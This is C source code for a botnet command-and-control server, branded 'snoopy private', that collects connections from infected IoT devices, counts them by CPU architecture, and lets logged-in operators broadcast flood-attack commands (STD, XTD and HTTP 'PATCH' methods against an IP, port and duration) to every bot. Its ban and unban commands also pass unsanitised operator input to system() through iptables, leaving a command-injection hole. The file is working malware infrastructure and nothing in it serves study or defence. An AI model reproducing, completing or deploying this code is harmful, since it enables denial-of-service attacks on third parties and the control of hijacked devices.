#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define MAXFDS 1000000


char *ipinfo[800];

struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char ARM;
		char mips;
		char mpsl;
		char ppc;
		char spc;
		char unknown;
	char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};


FILE *LogFile2;
FILE *LogFile3;

static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int DUPESDELETED = 0;


int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;34m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

					if (dup)
					{
						DUPESDELETED++;
						continue;
					}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf(" \"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}


unsigned int botsconnect()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login_info.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}



void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 
 void client_addr(struct sockaddr_in addr){

        sprintf(ipinfo, "%d.%d.%d.%d",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
    }

void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; iot connected: %d  %c", '\033', botsconnect(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}


//cnc by: snoopy        
void *BotWorker(void *sock)
 {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);
	
	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login_info.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
		
	}	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
		char user [5000];	
        {
		char username [5000];
        sprintf(username, "\e[0mUsername\e[1;31m:\e[0m\e[30m: ", accounts[find_line].username);
		if(send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);

        char nickstring[30];
	    snprintf(nickstring, sizeof(nickstring), "%s", buf);
	    memset(buf, 0, sizeof(buf));
	    trim(nickstring);
	    find_line = Find_Login(nickstring);
        if(strcmp(accounts[find_line].username, nickstring) != 0) goto failed;
        memset(buf, 0, 2048);

        if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

		char password [5000];
        sprintf(password, "\e[0mPassword\e[1;31m:\e[0m\e[30m: ", accounts[find_line].password);

		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        char *password1 = ("%s", buf);
        trim(password1);
        if(strcmp(accounts[find_line].password, password1) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
       }
        failed:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			FILE *iplog;
            iplog = fopen("fail_ip.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(iplog, "[sent at %s]: Fail: %s |\n", formatted_gmt, ipinfo);
            fclose(iplog);
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		        char banner1  [800];
		        char banner2  [800];
		        char banner3  [800];
		        char *userlog  [800];



 char hostbuffer[256]; 
    int hostname; 
    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
    checkHostName(hostname); 
  

FILE* fp1;
char motd[255];
char motd1[255];

fp1 = fopen("motd.txt", "r");

while(fgets(motd, 255, (FILE*) fp1)) {
    sprintf(motd1, "%s\n", motd);
}
fclose(fp1);


                char clearscreen1 [2048];
				memset(clearscreen1, 0, 2048);
				sprintf(clearscreen1, "\033[2J\033[1;1H");
				sprintf(banner1,  "\e[0mHello \e[1;31m%s\e[0m, welcome to \e[4;1;31msnoopy private\e[0m. made by snoopy.\e[0m\r\n", accounts[find_line].username);
				sprintf(userlog,  "%s", accounts[find_line].username);
				sprintf(banner3,  "\e[0mlocalhost: %s\e[0m\r\n", hostbuffer);
				sprintf(banner2,  "\e[0mMotd: %s\e[0m\r\n", motd1);
				if(send(datafd, clearscreen1,  strlen(clearscreen1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;  

		while(1) {
		char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   

      if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?") || strstr(buf, "helpme") || strstr(buf, "Help")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char hel1  [800];
				char hel2  [800];
				char hel3  [800];
				char hel4  [800];
				char hel5  [800];
				char hel6  [800];
				char hel7  [800];
				char hel8  [800];

                sprintf(hel1,  "\e[0m ╔══════════════════════════════════╗  \e[0m\r\n");    
				sprintf(hel2,  "\e[0m ║ bots    | shows bot count        ║  \e[0m\r\n");              
				sprintf(hel3,  "\e[0m ║ clear   | clears the screen      ║  \e[0m\r\n");
				sprintf(hel4,  "\e[0m ║ methods | all methods bot has    ║  \e[0m\r\n");
				sprintf(hel5,  "\e[0m ║ Banip   | ban ip/kill connection ║  \e[0m\r\n");    
				sprintf(hel6,  "\e[0m ║ Unbanip | unban ip from net      ║  \e[0m\r\n");    
    		    sprintf(hel7,  "\e[0m ║ support | open ticket to staff   ║  \e[0m\r\n");    
                sprintf(hel8,  "\e[0m ╚══════════════════════════════════╝  \e[0m\r\n");    
                
				if(send(datafd, hel1,  strlen(hel1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hel2,  strlen(hel2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hel3,  strlen(hel3),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hel4,  strlen(hel4),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hel5,  strlen(hel5),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hel6,  strlen(hel6),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hel7,  strlen(hel7),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hel8,  strlen(hel8),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "count") || strstr(buf, "COUNT")) {
            char synpur1[128];
            char synpur2[128];
            char synpur3[128];
            char synpur4[128];
            char synpur5[128];
            char synpur6[128];
            char synpur7[128];
            char synpur8[128];

            if(x86Connected() != 0)
            {
                sprintf(synpur1,"\e[0mx86: [%d] \e[0m\r\n",     x86Connected());
                if(send(datafd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
            }
            if(armConnected() != 0)
            {
                sprintf(synpur2,"\e[0marm: [%d] \e[0m\r\n",     armConnected());
                if(send(datafd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mipsConnected() != 0)
            {
                sprintf(synpur3,"\e[0mmips: [%d] \e[0m\r\n",     mipsConnected());
                if(send(datafd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mpslConnected() != 0)
            {
                sprintf(synpur4,"\e[0mmpsl: [%d] \e[0m\r\n",     mpslConnected());
                if(send(datafd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
            }
            if(ppcConnected() != 0)
            {
                sprintf(synpur5,"\e[0mppc: [%d] \e[0m\r\n",     ppcConnected());
                if(send(datafd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
            }
            if(spcConnected() != 0)
            {
                sprintf(synpur6,"\e[0mspc: [%d] \e[0m\r\n",     spcConnected());
                if(send(datafd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
            }
            if(unknownConnected() != 0)
            {
                sprintf(synpur7,"\e[0munknow: [%d] \e[0m\r\n",     unknownConnected());
                if(send(datafd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
            }
               sprintf(synpur8, "\e[0mcount: [%d] \e[0m\r\n",  botsconnect());
               if(send(datafd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;
            
			pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);

		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "method") || strstr(buf, "Method") ||  strstr(buf, "ATTACK") || strstr(buf, "Attack") || strstr(buf, "attack") || strstr(buf, "METHOD")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char atck0  [800];
				char atck1  [800];
				char atck2  [800];
				char atck3  [800];
				char atck4  [800];
				
                sprintf(atck0,  "\e[0m  ╔══════════════════════════════════════════════════╗  \e[0m\r\n");  
				sprintf(atck1,  "\e[0m  ║ !* STD IP PORT TIME - custom std                 ║  \e[0m\r\n");
				sprintf(atck2,  "\e[0m  ║ !* XTD IP PORT TIME   - custom std random        ║  \e[0m\r\n"); 
				sprintf(atck3,  "\e[0m  ║ !* PATCH IP PORT TIME POWER - custom http patch  ║ \e[0m\r\n");    
                sprintf(atck4,  "\e[0m  ╚══════════════════════════════════════════════════╝  \e[0m\r\n");  

                if(send(datafd, atck0,  strlen(atck0),	MSG_NOSIGNAL) == -1) goto end;               
				if(send(datafd, atck1,  strlen(atck1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, atck2,  strlen(atck2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, atck3,  strlen(atck3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, atck4,  strlen(atck4),	MSG_NOSIGNAL) == -1) goto end;


				pthread_create(&title, NULL, &TitleWriter, sock);
				char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);

		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "Banip")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char bannie111[40];
                char commandban[80];
                char commandban1[80];
                
                if(send(datafd, "\x1b[0mip: \x1b[37m", strlen("\x1b[0mip: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(bannie111, 0, sizeof(bannie111));
				read(datafd, bannie111, sizeof(bannie111));
				trim(bannie111);
				char banmsg[80];

                sprintf(commandban, "iptables -A INPUT -s %s -j DROP", bannie111);
                sprintf(commandban1, "iptables -A OUTPUT -s %s -j DROP", bannie111);

                system(commandban);
                system(commandban1);
                LogFile2 = fopen("ip.ban.unban.log", "a");
    
                fprintf(LogFile2, "[banned] |ip:%s|\n", bannie111);
                fclose(LogFile2);

                sprintf(banmsg, "ip:%s is banned\r\n", bannie111);

                if(send(datafd, banmsg,  strlen(banmsg),	MSG_NOSIGNAL) == -1) goto end; 

				pthread_create(&title, NULL, &TitleWriter, sock);
				char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);
        
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "Unbanip")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
                char bannie1 [800];
                char commandunban[80];
                char commandunban1[80];

                if(send(datafd, "\x1b[0mip: \x1b[37m", strlen("\x1b[0mip: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(bannie1, 0, sizeof(bannie1));
				read(datafd, bannie1, sizeof(bannie1));
				trim(bannie1);

				char unbanmsg[80];

                sprintf(commandunban, "iptables -D INPUT -s %s -j DROP", bannie1);
                sprintf(commandunban1, "iptables -D OUTPUT -s %s -j DROP", bannie1);

                system(commandunban);
                system(commandunban1);
                LogFile2 = fopen("ip.ban.unban.log", "a");
    
                fprintf(LogFile2, "[unbanned] |ip:%s|\n", bannie1);
                fclose(LogFile2);

                sprintf(unbanmsg, "ip:%s is unbanned\r\n", bannie1);

                if(send(datafd, unbanmsg,  strlen(unbanmsg),	MSG_NOSIGNAL) == -1) goto end;  

				pthread_create(&title, NULL, &TitleWriter, sock);
				char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);

		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "support") || strstr(buf, "SUPPORT") || strstr(buf, "Support")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
                char support [800];
                char supportmsg [800];

                if(send(datafd, "\x1b[0mMsg: \x1b[37m", strlen("\x1b[0mMsg: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(support, 0, sizeof(support));
				read(datafd, support, sizeof(support));
				trim(support);

                FILE *LogFilesupport;
                LogFilesupport = fopen("ticket.txt", "a");
    
                fprintf(LogFilesupport, "[User:%s] |%s|\n", userlog, support);
                fclose(LogFilesupport);

                sprintf(supportmsg,  "\e[0mticket open\e[0m\r\n");  

                if(send(datafd, supportmsg,  strlen(supportmsg),	MSG_NOSIGNAL) == -1) goto end;                 

				pthread_create(&title, NULL, &TitleWriter, sock);

		char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "!* STOP") || strstr(buf, "!* stop") || strstr(buf, "!* Stop"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[0m ok.\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
                if(send(datafd, clearscreen,  strlen(clearscreen),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;  
        while(1) {
        	
		char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
            trim(buf);
		char input [5000];
        sprintf(input, "\e[0m%s\e[1;31m# \e[0m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[sent at %s]: %s | Info: %s:%s:%s |\n", formatted_gmt, buf, userlog, accounts[find_line].password, ipinfo);
            fclose(LogFile);
            broadcast(buf, datafd, userlog);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}



void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {    
        	    client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
 

int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }


        	printf("\e[1;31m hello please use ctrl a+d to detach screen. \r\n"); 

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}

